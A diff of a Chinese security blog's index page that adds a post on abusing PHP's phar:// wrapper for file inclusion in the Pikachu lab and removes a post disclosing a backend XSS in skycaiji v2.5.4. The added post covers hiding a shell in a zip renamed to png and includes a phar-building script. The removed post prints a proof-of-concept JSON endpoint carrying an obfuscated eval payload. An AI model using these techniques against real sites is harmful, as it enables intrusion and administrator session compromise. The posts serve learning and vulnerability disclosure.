@@ -255,6 +255,98 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">php审计之phar://协议</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-07-10 17:44:57 / 修改时间：17:45:59" itemprop="dateCreated datePublished" datetime="2023-07-10T17:44:57+08:00">2023-07-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/daima/" itemprop="url" rel="index"><span itemprop="name">-daima</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="php审计之phar-协议"><a href="#php审计之phar-协议" class="headerlink" title="php审计之phar://协议"></a>php审计之phar://协议</h1><p>之前在网上看到这么个协议，感觉记忆有点模糊，故复现一下。</p>
+<ul>
+<li>php.ini中的phar.readonly设置为Off（默认为On）</li>
+</ul>
+<p>一般来说此协议可适用于文件包含</p>
+<p>这个协议就是用来读取压缩包中的文件内容的。</p>
+<p>我们这里用最最经典的pikachu靶场来做实验。</p>
+<p><img src="/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/image-20230709210835154.png" alt="image-20230709210835154"></p>
+<p>看代码，直接包含了get方法接收到的filename参数，我们这里去给include里面加一个压缩包，压缩包里面弄一个shell。</p>
+<p><img src="/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/image-20230709211004093.png" alt="image-20230709211004093"></p>
+<p><img src="/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/image-20230709211049372.png" alt="image-20230709211049372"></p>
+<p>现在我们去包含这个1.zip</p>
+<p>可以看到直接包含也只能看到里面的文件名字</p>
+<p><img src="/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/image-20230709211136275.png" alt="image-20230709211136275"></p>
+<p>但是我们使用，<code>phar://</code>协议去包含的话（中途改了下代码）</p>
+<p><img src="/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/image-20230710174430954.png" alt="image-20230710174430954"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://C:\code\phpstudy_pro\WWW\vul\fileinclude\include\12.zip\12.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/image-20230710174201307.png" alt="image-20230710174201307"></p>
+<p>而且后缀也不是非要zip，换成png也可以，这样就可以绕过了。</p>
+<h2 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h2><p>同时也可以用php脚本打包一个phar文件，下面是脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pharFilename</span> = <span class="string">&#x27;myapp.phar&#x27;</span>;</span><br><span class="line"><span class="variable">$entrypoint</span> = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="variable">$stub</span> = <span class="string">&lt;&lt;&lt;STUB</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">Phar::mapPhar(&#x27;<span class="subst">$pharFilename</span>&#x27;);</span></span><br><span class="line"><span class="string">include &#x27;phar://<span class="subst">$pharFilename</span>/<span class="subst">$entrypoint</span>&#x27;;</span></span><br><span class="line"><span class="string">__HALT_COMPILER();</span></span><br><span class="line"><span class="string">STUB</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="variable">$pharFilename</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加入口文件</span></span><br><span class="line"><span class="variable">$phpCode</span> = <span class="string">&#x27;&lt;?php echo &quot;Hello, World!&quot;;&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="variable">$entrypoint</span>, <span class="variable">$phpCode</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 stub（入口文件）</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="variable">$stub</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;成功生成 <span class="subst">$pharFilename</span>\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>phpcode就是包含的文件内容。</p>
+<p>ps:我用php7.3.4版本复现了一晚上都没成功，真要自杀了。换成5.6.9就可以了。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -429,92 +521,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/" class="post-title-link" itemprop="url">skycaiji-v2.5.4 has a backend xss vulnerability</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-05-02 23:40:05 / 修改时间：23:41:15" itemprop="dateCreated datePublished" datetime="2023-05-02T23:40:05+08:00">2023-05-02</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cve/" itemprop="url" rel="index"><span itemprop="name">-cve</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="skycaiji-v2-5-4-has-a-backend-xss-vulnerability"><a href="#skycaiji-v2-5-4-has-a-backend-xss-vulnerability" class="headerlink" title="skycaiji-v2.5.4 has a backend xss vulnerability"></a>skycaiji-v2.5.4 has a backend xss vulnerability</h1><p>Firstly, you can download the source code from the following website</p>
-<p><code>https://down.chinaz.com/api/index/download?id=38972&amp;type=code</code></p>
-<p>Directly place it in the root directory of the website, access the server IP, and follow the prompts to install</p>
-<p>After installation, log in to the backend.</p>
-<p><img src="/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/image-20230502232501330.png" alt="image-20230502232501330"></p>
-<p>Click to the above function point</p>
-<p>This is a JSON parsing function, but there is no complete xss protection in place.</p>
-<p>We can construct a file that returns the JSON format ourselves, then access it, and return it to the JSON format with xss to trigger the xss code in the background.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;John  &lt;img src=\&#x27;x\&#x27; onerror=\&quot;eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\&quot;&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;johndoe@example.com&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$json</span> = json_encode(<span class="variable">$data</span>);</span><br><span class="line"> </span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$json</span>;</span><br></pre></td></tr></table></figure>
-
-<p>This string of code will return a JSON data with malicious payload.</p>
-<p>We will deploy it on our own VPS and induce the backend administrator to parse its data, and we will find that the successful triggering of the xss code</p>
-<p><img src="/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/image-20230502232849580.png" alt="image-20230502232849580"></p>
-<p><img src="/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/image-20230502232855722.png" alt="image-20230502232855722"></p>
-<p>Attackers can use this vulnerability to do anything that JavaScript code can do</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/11/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="extend next" rel="next" href="/page/13/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/11/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/59/">59</a><a class="extend next" rel="next" href="/page/13/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -582,7 +592,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">174</span>
+          <span class="site-state-item-count">175</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
